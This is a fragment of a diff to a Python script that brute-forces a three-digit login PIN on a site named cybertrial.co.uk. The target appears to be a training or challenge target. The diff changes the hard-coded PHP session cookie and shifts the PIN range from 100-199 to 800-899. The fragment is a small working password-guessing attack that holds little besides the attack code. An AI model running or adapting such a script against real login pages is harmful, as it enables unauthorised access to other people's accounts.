@@ -2,11 +2,11 @@ import re, requests, sys, time
 
 
 url = "http://104.cybertrial.co.uk/login"
-cookies = {"PHPSESSID": "phn7307tcpd7t988doplh0j9c7"}
+cookies = {"PHPSESSID": "jdfbbpi23j5vci13dn5chigr02"}
 timeout = 11
 sess = requests.session()
 
-for pin in range(100,200):
+for pin in range(800,900):
     payload = {"formgo": "1",
                "pin": "{0:0=3d}".format(pin)
     }
